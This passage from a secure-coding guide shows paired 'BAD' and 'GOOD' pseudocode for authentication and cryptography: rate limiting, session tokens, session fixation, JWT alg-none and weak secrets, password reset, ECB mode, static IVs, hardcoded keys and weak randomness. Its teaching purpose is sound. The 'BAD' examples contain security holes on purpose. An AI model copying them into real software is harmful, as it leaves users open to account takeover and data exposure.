FUNCTION validate_password_strength(password):
    errors = []

    // Minimum length (NIST recommends 8+, many use 12+)
    IF password.length < 12:
        errors.append("Password must be at least 12 characters")
    END IF

    // Maximum length (prevent DoS via very long passwords)
    IF password.length > 128:
        errors.append("Password must not exceed 128 characters")
    END IF

    // Check character diversity
    has_upper = regex.search("[A-Z]", password)
    has_lower = regex.search("[a-z]", password)
    has_digit = regex.search("[0-9]", password)
    has_special = regex.search("[!@#$%^&*(),.?\":{}|<>]", password)

    IF NOT (has_upper AND has_lower AND has_digit):
        errors.append("Password must contain uppercase, lowercase, and numbers")
    END IF

    // Check against common passwords list
    IF is_common_password(password):
        errors.append("Password is too common, choose a unique password")
    END IF

    // Check against breached passwords (via k-Anonymity API)
    IF is_breached_password(password):
        errors.append("Password found in data breach, choose another")
    END IF

    // Check for username in password
    IF password.lower().contains(username.lower()):
        errors.append("Password cannot contain username")
    END IF

    RETURN {
        is_valid: errors.length == 0,
        message: errors.join("; ")
    }
END FUNCTION

// Check breached passwords using k-Anonymity (e.g., HaveIBeenPwned API)
FUNCTION is_breached_password(password):
    hash = sha1(password).upper()
    prefix = hash.substring(0, 5)
    suffix = hash.substring(5)

    // Only send hash prefix to API (privacy-preserving)
    response = http.get("https://api.pwnedpasswords.com/range/" + prefix)
    hashes = parse_pwned_response(response)

    RETURN suffix IN hashes
END FUNCTION
```

### 4.2 Missing Rate Limiting on Auth Endpoints

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No rate limiting on authentication
// ========================================
FUNCTION login(username, password):
    // Vulnerable: No limit on login attempts
    user = database.find_user(username)

    IF user IS NULL:
        RETURN {success: FALSE, error: "Invalid credentials"}
    END IF

    IF bcrypt.verify(password, user.password_hash):
        RETURN {success: TRUE, token: generate_token(user)}
    ELSE:
        RETURN {success: FALSE, error: "Invalid credentials"}
    END IF
END FUNCTION

// Problems:
// - Allows unlimited password guessing (brute force)
// - Allows credential stuffing attacks
// - No account lockout protection

// ========================================
// GOOD: Rate limiting with progressive delays
// ========================================
FUNCTION login(username, password):
    client_ip = request.get_client_ip()

    // Check IP-based rate limit (protects against distributed attacks)
    IF is_ip_rate_limited(client_ip):
        log.warning("Rate limited IP attempted login", {ip: client_ip})
        RETURN {success: FALSE, error: "Too many attempts, try again later"}
    END IF

    // Check account-based rate limit (protects specific accounts)
    IF is_account_rate_limited(username):
        log.warning("Rate limited account attempted login", {username: username})
        RETURN {success: FALSE, error: "Account temporarily locked"}
    END IF

    user = database.find_user(username)

    // Use constant-time comparison to prevent timing attacks
    IF user IS NULL OR NOT bcrypt.verify(password, user.password_hash):
        record_failed_attempt(username, client_ip)
        // Generic error message (don't reveal if user exists)
        RETURN {success: FALSE, error: "Invalid credentials"}
    END IF

    // Successful login - reset counters
    clear_failed_attempts(username, client_ip)

    RETURN {success: TRUE, token: generate_token(user)}
END FUNCTION

// IP-based rate limiting
FUNCTION is_ip_rate_limited(ip):
    key = "login_attempts:ip:" + ip
    attempts = rate_limiter.get(key, default=0)

    // Allow 10 attempts per 15 minutes per IP
    RETURN attempts >= 10
END FUNCTION

// Account-based rate limiting with progressive lockout
FUNCTION is_account_rate_limited(username):
    key = "login_attempts:user:" + username
    attempts = rate_limiter.get(key, default=0)

    // Progressive lockout:
    // 5 attempts: 1 minute lockout
    // 10 attempts: 5 minute lockout
    // 15 attempts: 15 minute lockout
    // 20+ attempts: 1 hour lockout

    IF attempts >= 20:
        lockout_time = 3600  // 1 hour
    ELSE IF attempts >= 15:
        lockout_time = 900   // 15 minutes
    ELSE IF attempts >= 10:
        lockout_time = 300   // 5 minutes
    ELSE IF attempts >= 5:
        lockout_time = 60    // 1 minute
    ELSE:
        RETURN FALSE
    END IF

    last_attempt = rate_limiter.get_timestamp(key)
    RETURN (current_time() - last_attempt) < lockout_time
END FUNCTION

FUNCTION record_failed_attempt(username, ip):
    // Increment both counters with TTL
    rate_limiter.increment("login_attempts:ip:" + ip, ttl=900)
    rate_limiter.increment("login_attempts:user:" + username, ttl=3600)

    // Alert on suspicious patterns
    ip_attempts = rate_limiter.get("login_attempts:ip:" + ip)
    IF ip_attempts >= 50:
        security_alert("Possible brute force attack from IP: " + ip)
    END IF
END FUNCTION
```

### 4.3 Insecure Session Token Generation

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Predictable session tokens
// ========================================
FUNCTION create_session_weak(user_id):
    // Vulnerable: Predictable token based on user ID
    token = "session_" + user_id + "_" + current_timestamp()
    RETURN token
END FUNCTION

FUNCTION create_session_sequential():
    // Vulnerable: Sequential/incremental tokens
    GLOBAL session_counter
    session_counter = session_counter + 1
    RETURN "session_" + session_counter
END FUNCTION

FUNCTION create_session_weak_random():
    // Vulnerable: Using Math.random() or similar weak PRNG
    token = ""
    FOR i = 1 TO 32:
        token = token + random_char()  // Math.random() based
    END FOR
    RETURN token
END FUNCTION

// Attack: Attacker can predict/enumerate session tokens
// - Timestamp-based: Try tokens from recent timestamps
// - Sequential: Try nearby session IDs
// - Weak random: Seed prediction or insufficient entropy

// ========================================
// GOOD: Cryptographically secure session tokens
// ========================================
FUNCTION create_session(user_id):
    // Generate cryptographically secure random token
    // Use 256 bits (32 bytes) minimum for security
    token_bytes = crypto.secure_random_bytes(32)
    token = base64_url_encode(token_bytes)  // URL-safe encoding

    // Store session with metadata
    session_data = {
        user_id: user_id,
        created_at: current_timestamp(),
        expires_at: current_timestamp() + SESSION_LIFETIME,
        ip_address: request.get_client_ip(),
        user_agent: request.get_user_agent()
    }

    // Store hashed token (protect against database leaks)
    token_hash = sha256(token)
    session_store.set(token_hash, session_data)

    RETURN token
END FUNCTION

FUNCTION validate_session(token):
    IF token IS NULL OR token.length < 32:
        RETURN NULL
    END IF

    token_hash = sha256(token)
    session = session_store.get(token_hash)

    IF session IS NULL:
        RETURN NULL
    END IF

    // Check expiration
    IF current_timestamp() > session.expires_at:
        session_store.delete(token_hash)
        RETURN NULL
    END IF

    // Optional: Validate IP/User-Agent consistency
    IF session.ip_address != request.get_client_ip():
        log.warning("Session IP mismatch", {
            expected: session.ip_address,
            actual: request.get_client_ip()
        })
        // Decide whether to invalidate or just log
    END IF

    RETURN session
END FUNCTION

// Secure cookie configuration
FUNCTION set_session_cookie(response, token):
    response.set_cookie("session", token, {
        httponly: TRUE,      // Prevent JavaScript access
        secure: TRUE,        // HTTPS only
        samesite: "Strict",  // Prevent CSRF
        max_age: SESSION_LIFETIME,
        path: "/"
    })
END FUNCTION
```

### 4.4 Session Fixation Vulnerabilities

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Session ID not regenerated on login
// ========================================
FUNCTION login_vulnerable(username, password):
    // Session ID was set when user first visited (before login)
    session_id = request.get_cookie("session_id")

    user = authenticate(username, password)
    IF user IS NULL:
        RETURN {success: FALSE}
    END IF

    // Vulnerable: Reusing pre-authentication session ID
    session_store.set(session_id, {user_id: user.id, authenticated: TRUE})
    RETURN {success: TRUE}
END FUNCTION

// Attack scenario:
// 1. Attacker visits site, gets session_id=ABC123
// 2. Attacker sends victim link: https://site.com?session_id=ABC123
// 3. Victim logs in with attacker's session ID
// 4. Attacker uses session_id=ABC123 to access victim's account

// ========================================
// GOOD: Regenerate session on authentication changes
// ========================================
FUNCTION login_secure(username, password):
    user = authenticate(username, password)
    IF user IS NULL:
        RETURN {success: FALSE}
    END IF

    // CRITICAL: Invalidate old session and create new one
    old_session_id = request.get_cookie("session_id")
    IF old_session_id IS NOT NULL:
        session_store.delete(old_session_id)
    END IF

    // Generate completely new session ID
    new_session = create_session(user.id)

    // Set new session cookie
    response.set_cookie("session_id", new_session.token, {
        httponly: TRUE,
        secure: TRUE,
        samesite: "Strict"
    })

    RETURN {success: TRUE}
END FUNCTION

// Also regenerate session on privilege escalation
FUNCTION elevate_privileges(user, new_role):
    // Invalidate current session
    old_session_id = request.get_cookie("session_id")
    session_store.delete(old_session_id)

    // Create new session with elevated privileges
    new_session = create_session(user.id)
    new_session.role = new_role

    response.set_cookie("session_id", new_session.token, {
        httponly: TRUE,
        secure: TRUE,
        samesite: "Strict"
    })

    RETURN new_session
END FUNCTION

// Regenerate session periodically for long-lived sessions
FUNCTION check_session_rotation(session):
    // Rotate session every 15 minutes for active users
    IF current_timestamp() - session.created_at > 900:
        new_session = create_session(session.user_id)
        new_session.data = session.data  // Preserve session data

        session_store.delete(session.id)

        response.set_cookie("session_id", new_session.token, {
            httponly: TRUE,
            secure: TRUE,
            samesite: "Strict"
        })

        RETURN new_session
    END IF

    RETURN session
END FUNCTION
```

### 4.5 JWT Misuse (None Algorithm, Weak Secrets, Sensitive Data)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Common JWT security mistakes
// ========================================

// Mistake 1: Not verifying algorithm (none algorithm attack)
FUNCTION verify_jwt_vulnerable(token):
    // Vulnerable: Accepts whatever algorithm is in the header
    decoded = jwt.decode(token, SECRET_KEY)  // Attacker sets alg: "none"
    RETURN decoded
END FUNCTION

// Mistake 2: Weak or short secret key
CONSTANT JWT_SECRET = "secret123"  // Easily brute-forced

FUNCTION create_jwt_weak(user_id):
    payload = {user_id: user_id, exp: current_time() + 86400}
    RETURN jwt.encode(payload, JWT_SECRET, algorithm="HS256")
END FUNCTION

// Mistake 3: Sensitive data in payload (JWTs are base64, not encrypted!)
FUNCTION create_jwt_exposed(user):
    payload = {
        user_id: user.id,
        email: user.email,
        ssn: user.social_security_number,  // PII in token!
        credit_card: user.card_number,      // Sensitive data exposed!
        password_hash: user.password_hash,  // Never put this in JWT!
        exp: current_time() + 86400
    }
    RETURN jwt.encode(payload, SECRET_KEY)
END FUNCTION

// Mistake 4: No expiration or very long expiration
FUNCTION create_jwt_no_expiry(user_id):
    payload = {user_id: user_id}  // No exp claim!
    RETURN jwt.encode(payload, SECRET_KEY)
END FUNCTION

// ========================================
// GOOD: Secure JWT implementation
// ========================================

// Use a strong secret (256+ bits for HS256)
CONSTANT JWT_SECRET = environment.get("JWT_SECRET")  // From secret manager

FUNCTION initialize_jwt():
    // Validate secret strength at startup
    IF JWT_SECRET IS NULL OR JWT_SECRET.length < 32:
        THROW Error("JWT_SECRET must be at least 256 bits")
    END IF
END FUNCTION

FUNCTION create_jwt_secure(user_id):
    now = current_time()

    payload = {
        // Standard claims
        sub: user_id,           // Subject
        iat: now,               // Issued at
        exp: now + 3600,        // Expiration (1 hour max for access tokens)
        nbf: now,               // Not before

        // Custom claims (non-sensitive only!)
        role: user.role         // Roles are OK
        // Never include: passwords, PII, payment info
    }

    // Explicitly specify algorithm
    RETURN jwt.encode(payload, JWT_SECRET, algorithm="HS256")
END FUNCTION

FUNCTION verify_jwt_secure(token):
    TRY:
        // CRITICAL: Explicitly specify allowed algorithms
        decoded = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])

        // Additional validation
        IF decoded.exp < current_time():
            THROW Error("Token expired")
        END IF

        IF decoded.nbf > current_time():
            THROW Error("Token not yet valid")
        END IF

        RETURN decoded

    CATCH JWTError as e:
        log.warning("JWT verification failed", {error: e.message})
        RETURN NULL
    END TRY
END FUNCTION

// For sensitive applications, use asymmetric keys (RS256)
FUNCTION create_jwt_asymmetric(user_id):
    private_key = load_private_key("jwt_private.pem")

    payload = {
        sub: user_id,
        iat: current_time(),
        exp: current_time() + 3600
    }

    // Sign with private key
    RETURN jwt.encode(payload, private_key, algorithm="RS256")
END FUNCTION

FUNCTION verify_jwt_asymmetric(token):
    public_key = load_public_key("jwt_public.pem")

    // Verify with public key (can be shared safely)
    RETURN jwt.decode(token, public_key, algorithms=["RS256"])
END FUNCTION

// Implement refresh token pattern for long-lived sessions
FUNCTION create_token_pair(user_id):
    // Short-lived access token (15 minutes)
    access_token = create_jwt_secure(user_id, expiry=900)

    // Long-lived refresh token (7 days) - store in DB for revocation
    refresh_token = crypto.secure_random_bytes(32).to_base64()
    database.insert("refresh_tokens", {
        token_hash: sha256(refresh_token),
        user_id: user_id,
        expires_at: current_time() + 604800
    })

    RETURN {
        access_token: access_token,
        refresh_token: refresh_token
    }
END FUNCTION
```

### 4.6 Missing MFA Considerations

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Single-factor authentication only
// ========================================
FUNCTION login_single_factor(username, password):
    user = database.find_user(username)

    IF user IS NULL OR NOT bcrypt.verify(password, user.password_hash):
        RETURN {success: FALSE, error: "Invalid credentials"}
    END IF

    // Immediately grant full access after password verification
    token = create_session(user.id)
    RETURN {success: TRUE, token: token}
END FUNCTION

// Problems:
// - Compromised password = full account takeover
// - No protection against credential stuffing
// - Phishing attacks succeed completely
// - No step-up authentication for sensitive operations

// ========================================
// GOOD: MFA-aware authentication flow
// ========================================
FUNCTION login_with_mfa(username, password):
    user = database.find_user(username)

    IF user IS NULL OR NOT bcrypt.verify(password, user.password_hash):
        RETURN {success: FALSE, error: "Invalid credentials"}
    END IF

    // Check if MFA is enabled
    IF user.mfa_enabled:
        // Create partial session (not fully authenticated)
        partial_token = create_partial_session(user.id)

        RETURN {
            success: FALSE,
            mfa_required: TRUE,
            partial_token: partial_token,
            mfa_methods: get_user_mfa_methods(user.id)
        }
    END IF

    // If MFA not enabled, encourage setup
    token = create_session(user.id)
    RETURN {
        success: TRUE,
        token: token,
        mfa_suggestion: user.is_admin  // Strongly suggest MFA for admins
    }
END FUNCTION

FUNCTION verify_mfa(partial_token, mfa_code, mfa_method):
    session = get_partial_session(partial_token)

    IF session IS NULL OR session.expires_at < current_time():
        RETURN {success: FALSE, error: "Session expired, please login again"}
    END IF

    user = database.get_user(session.user_id)

    // Verify MFA code based on method
    is_valid = FALSE

    IF mfa_method == "totp":
        is_valid = verify_totp(user.totp_secret, mfa_code)
    ELSE IF mfa_method == "sms":
        is_valid = verify_sms_code(user.id, mfa_code)
    ELSE IF mfa_method == "backup":
        is_valid = verify_backup_code(user.id, mfa_code)
    END IF

    IF NOT is_valid:
        record_failed_mfa_attempt(user.id)
        RETURN {success: FALSE, error: "Invalid verification code"}
    END IF

    // MFA verified - create full session
    delete_partial_session(partial_token)
    token = create_session(user.id)

    RETURN {success: TRUE, token: token}
END FUNCTION

// TOTP verification with time window
FUNCTION verify_totp(secret, code):
    // Allow 1 step before and after for clock drift (30 second windows)
    FOR step IN [-1, 0, 1]:
        expected = generate_totp(secret, time_step=step)
        IF constant_time_compare(code, expected):
            RETURN TRUE
        END IF
    END FOR
    RETURN FALSE
END FUNCTION

// Step-up authentication for sensitive operations
FUNCTION require_recent_auth(user_session, max_age_seconds):
    IF current_time() - user_session.authenticated_at > max_age_seconds:
        RETURN {
            requires_reauth: TRUE,
            message: "Please re-enter your password for this action"
        }
    END IF
    RETURN {requires_reauth: FALSE}
END FUNCTION

FUNCTION perform_sensitive_action(session, action, password):
    // Require recent password entry for sensitive actions
    user = database.get_user(session.user_id)

    IF NOT bcrypt.verify(password, user.password_hash):
        RETURN {success: FALSE, error: "Invalid password"}
    END IF

    // Update authentication timestamp
    session.authenticated_at = current_time()

    // Perform the sensitive action
    RETURN execute_action(action)
END FUNCTION
```

### 4.7 Insecure Password Reset Flows

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Insecure password reset implementations
// ========================================

// Mistake 1: Predictable reset tokens
FUNCTION create_reset_token_weak(user_id):
    // Vulnerable: MD5 of user_id + timestamp is guessable
    token = md5(user_id + current_timestamp())
    database.save_reset_token(user_id, token)
    RETURN token
END FUNCTION

// Mistake 2: Token never expires
FUNCTION request_password_reset_no_expiry(email):
    user = database.find_user_by_email(email)
    token = generate_token()
    // Vulnerable: No expiration set
    database.save_reset_token(user.id, token)
    send_email(email, "Reset: " + BASE_URL + "/reset?token=" + token)
END FUNCTION

// Mistake 3: Token not invalidated after use
FUNCTION reset_password_reusable(token, new_password):
    user_id = database.get_user_by_reset_token(token)
    user = database.get_user(user_id)
    user.password_hash = hash(new_password)
    database.save(user)
    // Vulnerable: Token still valid, can be reused!
END FUNCTION

// Mistake 4: User enumeration via different responses
FUNCTION request_reset_enumeration(email):
    user = database.find_user_by_email(email)
    IF user IS NULL:
        RETURN {error: "No account found with this email"}  // Reveals info!
    END IF
    // ... send reset email
    RETURN {success: TRUE, message: "Reset email sent"}
END FUNCTION

// Mistake 5: Sending password in email
FUNCTION reset_password_insecure(email):
    user = database.find_user_by_email(email)
    new_password = generate_random_password()
    user.password_hash = hash(new_password)
    // Vulnerable: Password in plaintext email
    send_email(email, "Your new password is: " + new_password)
END FUNCTION

// ========================================
// GOOD: Secure password reset flow
// ========================================
FUNCTION request_password_reset(email):
    // Always return same response to prevent enumeration
    user = database.find_user_by_email(email)

    IF user IS NOT NULL:
        // Invalidate any existing reset tokens
        database.delete_reset_tokens(user.id)

        // Generate cryptographically secure token
        token_bytes = crypto.secure_random_bytes(32)
        token = base64_url_encode(token_bytes)

        // Store hashed token with expiration
        token_hash = sha256(token)
        database.save_reset_token({
            user_id: user.id,
            token_hash: token_hash,
            expires_at: current_time() + 3600,  // 1 hour expiration
            created_at: current_time()
        })

        // Send reset email
        reset_url = BASE_URL + "/reset-password?token=" + token
        send_email(user.email, "password_reset", {reset_url: reset_url})

        log.info("Password reset requested", {user_id: user.id})
    END IF

    // Same response whether user exists or not
    RETURN {
        success: TRUE,
        message: "If an account exists, a reset email has been sent"
    }
END FUNCTION

FUNCTION validate_reset_token(token):
    IF token IS NULL OR token.length < 32:
        RETURN NULL
    END IF

    token_hash = sha256(token)
    reset_record = database.find_reset_token(token_hash)

    IF reset_record IS NULL:
        log.warning("Invalid reset token attempted")
        RETURN NULL
    END IF

    // Check expiration
    IF current_time() > reset_record.expires_at:
        database.delete_reset_token(token_hash)
        RETURN NULL
    END IF

    RETURN reset_record
END FUNCTION

FUNCTION reset_password(token, new_password):
    reset_record = validate_reset_token(token)

    IF reset_record IS NULL:
        RETURN {success: FALSE, error: "Invalid or expired reset link"}
    END IF

    // Validate new password strength
    validation = validate_password_strength(new_password)
    IF NOT validation.is_valid:
        RETURN {success: FALSE, error: validation.message}
    END IF

    user = database.get_user(reset_record.user_id)

    // Check if new password is same as old
    IF bcrypt.verify(new_password, user.password_hash):
        RETURN {success: FALSE, error: "New password must be different"}
    END IF

    // Update password
    user.password_hash = bcrypt.hash(new_password, rounds=12)
    database.save(user)

    // CRITICAL: Invalidate the reset token
    database.delete_reset_token(sha256(token))

    // Invalidate all existing sessions (force re-login)
    session_store.delete_all_user_sessions(user.id)

    // Send confirmation email
    send_email(user.email, "password_changed", {
        timestamp: current_time(),
        ip_address: request.get_client_ip()
    })

    log.info("Password reset completed", {user_id: user.id})

    RETURN {success: TRUE, message: "Password reset successfully"}
END FUNCTION

// Additional security: Limit reset requests
FUNCTION rate_limit_reset_requests(email):
    key = "password_reset:" + sha256(email)
    attempts = rate_limiter.get(key, default=0)

    IF attempts >= 3:
        // Max 3 reset requests per hour
        RETURN FALSE
    END IF

    rate_limiter.increment(key, ttl=3600)
    RETURN TRUE
END FUNCTION
```

---

## 5. Cryptographic Failures

**CWE References:** CWE-327 (Use of Broken or Risky Cryptographic Algorithm), CWE-328 (Reversible One-Way Hash), CWE-330 (Use of Insufficiently Random Values), CWE-326 (Inadequate Encryption Strength), CWE-759 (Use of One-Way Hash without a Salt)
**Severity:** High to Critical | **Related:** [[Cryptographic-Misuse]]

> **Risk:** AI models frequently suggest outdated or weak cryptographic algorithms (MD5, SHA-1, DES) learned from decades of legacy code in training data. Cryptographic failures lead to data exposure, password compromise, and authentication bypass. A 14% failure rate for CWE-327 was documented in AI-generated code, with "significant increase" in encryption vulnerabilities when using AI assistants.

### 5.1 Using Deprecated Algorithms (MD5, SHA1 for Security, DES)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Deprecated hash algorithms for security
// ========================================
FUNCTION hash_password_weak(password):
    // Vulnerable: MD5 is cryptographically broken
    RETURN md5(password)
END FUNCTION

FUNCTION verify_integrity_weak(data):
    // Vulnerable: SHA-1 has known collision attacks
    RETURN sha1(data)
END FUNCTION

FUNCTION encrypt_data_weak(plaintext, key):
    // Vulnerable: DES uses 56-bit keys (trivially breakable)
    cipher = DES.new(key, mode=ECB)
    RETURN cipher.encrypt(plaintext)
END FUNCTION

// Problems:
// - MD5: Collisions found in seconds, rainbow tables widely available
// - SHA-1: Collision attacks demonstrated (SHAttered, 2017)
// - DES: Brute-forceable in hours with modern hardware

// ========================================
// GOOD: Modern cryptographic algorithms
// ========================================
FUNCTION hash_password_secure(password):
    // Use bcrypt, Argon2, or scrypt for passwords
    salt = bcrypt.generate_salt(rounds=12)
    RETURN bcrypt.hash(password, salt)
END FUNCTION

FUNCTION verify_integrity_secure(data):
    // Use SHA-256, SHA-3, or BLAKE2 for integrity
    RETURN sha256(data)
END FUNCTION

FUNCTION encrypt_data_secure(plaintext, key):
    // Use AES-256-GCM or ChaCha20-Poly1305
    nonce = crypto.secure_random_bytes(12)
    cipher = AES_GCM.new(key, nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    RETURN nonce + tag + ciphertext  // Include nonce and auth tag
END FUNCTION

// Algorithm selection guide:
// - Password hashing: bcrypt, Argon2id, scrypt (NOT SHA-256 alone)
// - Symmetric encryption: AES-256-GCM, ChaCha20-Poly1305
// - Integrity/checksums: SHA-256, SHA-3, BLAKE2
// - Signatures: Ed25519, ECDSA with P-256, RSA-2048+
```

### 5.2 Hardcoded Encryption Keys

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Hardcoded encryption keys in source
// ========================================
CONSTANT ENCRYPTION_KEY = "MySecretKey12345"  // Committed to repo!
CONSTANT AES_KEY = bytes([0x2b, 0x7e, 0x15, 0x16, ...])  // Still hardcoded

FUNCTION encrypt_user_data(data):
    cipher = AES.new(ENCRYPTION_KEY, mode=GCM)
    RETURN cipher.encrypt(data)
END FUNCTION

// Problems:
// - Keys in version control are exposed forever
// - Cannot rotate keys without code changes
// - All environments share same key

// ========================================
// GOOD: External key management
// ========================================
FUNCTION get_encryption_key():
    // Option 1: Environment variable
    key = environment.get("ENCRYPTION_KEY")

    IF key IS NULL:
        THROW Error("ENCRYPTION_KEY environment variable required")
    END IF

    // Validate key length for AES-256
    key_bytes = base64_decode(key)
    IF key_bytes.length != 32:
        THROW Error("ENCRYPTION_KEY must be 256 bits")
    END IF

    RETURN key_bytes
END FUNCTION

FUNCTION encrypt_user_data(data):
    key = get_encryption_key()
    nonce = crypto.secure_random_bytes(12)
    cipher = AES_GCM.new(key, nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    RETURN nonce + tag + ciphertext
END FUNCTION

// Better: Use a secret manager for production
FUNCTION get_encryption_key_from_manager():
    TRY:
        // AWS Secrets Manager, HashiCorp Vault, Azure Key Vault, etc.
        secret = secret_manager.get_secret("encryption-key")
        RETURN base64_decode(secret.value)
    CATCH Error as e:
        log.error("Failed to retrieve encryption key", {error: e.message})
        THROW Error("Encryption key unavailable")
    END TRY
END FUNCTION
```

### 5.3 ECB Mode Usage

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: ECB mode reveals patterns in data
// ========================================
FUNCTION encrypt_ecb(plaintext, key):
    // Vulnerable: ECB encrypts identical blocks identically
    cipher = AES.new(key, mode=ECB)
    RETURN cipher.encrypt(pad(plaintext))
END FUNCTION

// Problem demonstration:
// Encrypting an image with ECB mode preserves visual patterns
// because identical 16-byte blocks produce identical ciphertext
// This reveals structure of the original data!

// Identical plaintexts produce identical ciphertexts:
// plaintext_block_1 = "AAAAAAAAAAAAAAAA"
// plaintext_block_2 = "AAAAAAAAAAAAAAAA"
// ciphertext_1 == ciphertext_2  // Information leaked!

// ========================================
// GOOD: Use authenticated encryption modes
// ========================================
FUNCTION encrypt_gcm(plaintext, key):
    // GCM mode: Each encryption is unique even for same plaintext
    nonce = crypto.secure_random_bytes(12)  // 96-bit nonce for GCM

    cipher = AES_GCM.new(key, nonce)
    ciphertext, auth_tag = cipher.encrypt_and_digest(plaintext)

    // Return nonce + tag + ciphertext (all needed for decryption)
    RETURN nonce + auth_tag + ciphertext
END FUNCTION

FUNCTION decrypt_gcm(encrypted_data, key):
    // Extract components
    nonce = encrypted_data[0:12]
    auth_tag = encrypted_data[12:28]
    ciphertext = encrypted_data[28:]

    cipher = AES_GCM.new(key, nonce)

    TRY:
        plaintext = cipher.decrypt_and_verify(ciphertext, auth_tag)
        RETURN plaintext
    CATCH AuthenticationError:
        // Tampering detected!
        log.warning("Decryption failed: authentication tag mismatch")
        THROW Error("Data integrity check failed")
    END TRY
END FUNCTION

// Alternative: CBC mode (if GCM not available)
FUNCTION encrypt_cbc(plaintext, key):
    // CBC requires random IV for each encryption
    iv = crypto.secure_random_bytes(16)

    cipher = AES_CBC.new(key, iv)
    padded = pkcs7_pad(plaintext, block_size=16)
    ciphertext = cipher.encrypt(padded)

    // Must also add HMAC for authentication (encrypt-then-MAC)
    mac = hmac_sha256(key, iv + ciphertext)

    RETURN iv + ciphertext + mac
END FUNCTION
```

### 5.4 Missing or Weak IVs/Nonces

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Predictable or reused IVs/nonces
// ========================================
FUNCTION encrypt_static_iv(plaintext, key):
    // Vulnerable: Static IV - identical plaintexts have identical ciphertexts
    iv = bytes([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])
    cipher = AES_CBC.new(key, iv)
    RETURN cipher.encrypt(pad(plaintext))
END FUNCTION

FUNCTION encrypt_counter_nonce(plaintext, key, message_counter):
    // Vulnerable: Predictable counter-based nonce
    nonce = int_to_bytes(message_counter, length=12)
    cipher = AES_GCM.new(key, nonce)
    RETURN cipher.encrypt(plaintext)
END FUNCTION

FUNCTION encrypt_truncated_nonce(plaintext, key):
    // Vulnerable: Nonce too short
    nonce = crypto.secure_random_bytes(4)  // Only 32 bits!
    cipher = AES_GCM.new(key, nonce)
    RETURN cipher.encrypt(plaintext)
END FUNCTION

// Problems:
// - Static IV: Same plaintext → same ciphertext (pattern leakage)
// - Predictable nonce: Allows chosen-plaintext attacks
// - Short nonce: Birthday collision after ~2^16 messages
// - GCM with repeated nonce: CATASTROPHIC - authentication key recovered!

// ========================================
// GOOD: Cryptographically random IVs/nonces
// ========================================
FUNCTION encrypt_with_random_iv(plaintext, key):
    // Generate random IV for each encryption
    iv = crypto.secure_random_bytes(16)  // 128 bits for AES-CBC

    cipher = AES_CBC.new(key, iv)
    padded = pkcs7_pad(plaintext, block_size=16)
    ciphertext = cipher.encrypt(padded)

    // Prepend IV (it's not secret, just must be unique)
    RETURN iv + ciphertext
END FUNCTION

FUNCTION encrypt_with_random_nonce(plaintext, key):
    // Generate random nonce for each encryption
    nonce = crypto.secure_random_bytes(12)  // 96 bits for AES-GCM

    cipher = AES_GCM.new(key, nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)

    RETURN nonce + tag + ciphertext
END FUNCTION

// For high-volume encryption: Use key+nonce management
FUNCTION encrypt_with_derived_nonce(plaintext, key, message_id):
    // Derive unique nonce from random key-specific prefix + message ID
    // This prevents nonce reuse across different encryption contexts

    nonce_key = derive_key(key, "nonce-derivation")
    nonce = hmac_sha256(nonce_key, message_id)[0:12]

    cipher = AES_GCM.new(key, nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)

    RETURN message_id + tag + ciphertext  // Include message_id for decryption
END FUNCTION
```

### 5.5 Rolling Your Own Crypto

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Custom cryptographic implementations
// ========================================
FUNCTION my_encrypt(plaintext, key):
    // Vulnerable: XOR "encryption" is trivially broken
    result = ""
    FOR i = 0 TO plaintext.length - 1:
        result += char(plaintext[i] XOR key[i % key.length])
    END FOR
    RETURN result
END FUNCTION

FUNCTION my_hash(data):
    // Vulnerable: Custom hash is not collision-resistant
    result = 0
    FOR byte IN data:
        result = (result * 31 + byte) % 2147483647
    END FOR
    RETURN result
END FUNCTION

FUNCTION my_random(seed):
    // Vulnerable: Linear congruential generator
    RETURN (seed * 1103515245 + 12345) % (2^31)
END FUNCTION

// Problems:
// - XOR cipher: Trivially broken with known-plaintext
// - Custom hash: Collisions easily found
// - LCG random: Completely predictable sequence

// ========================================
// GOOD: Use established cryptographic libraries
// ========================================
FUNCTION encrypt_properly(plaintext, key):
    // Use vetted library implementations
    // Python: cryptography library
    // Node.js: crypto module
    // Java: javax.crypto
    // Go: crypto/* packages

    // AES-GCM from standard library
    nonce = crypto.secure_random_bytes(12)
    cipher = crypto.createCipheriv("aes-256-gcm", key, nonce)

    ciphertext = cipher.update(plaintext) + cipher.final()
    auth_tag = cipher.getAuthTag()

    RETURN nonce + auth_tag + ciphertext
END FUNCTION

FUNCTION hash_properly(data):
    // Use standard library hash functions
    RETURN crypto.sha256(data)
END FUNCTION

FUNCTION random_properly(num_bytes):
    // Use OS-provided cryptographic randomness
    RETURN crypto.secure_random_bytes(num_bytes)
END FUNCTION

// Rule: Never implement cryptographic primitives yourself
// - Encryption: Use library AES-GCM, ChaCha20-Poly1305
// - Hashing: Use library SHA-256, SHA-3, BLAKE2
// - Signatures: Use library Ed25519, ECDSA
// - Random: Use library secrets module or os.urandom
```

### 5.6 Insecure Random Number Generation

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Non-cryptographic RNG for security
// ========================================
FUNCTION generate_session_id_weak():
    // Vulnerable: Math.random() / random.random() is predictable
    RETURN random.randint(0, 999999999)
END FUNCTION

FUNCTION generate_token_weak():
    // Vulnerable: Using random module for security tokens
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    token = ""
    FOR i = 0 TO 32:
        token += chars[random.randint(0, chars.length - 1)]
    END FOR
    RETURN token
END FUNCTION

FUNCTION generate_key_weak():
    // Vulnerable: Time-based seeding
    random.seed(current_timestamp())
    key = random.randbytes(32)
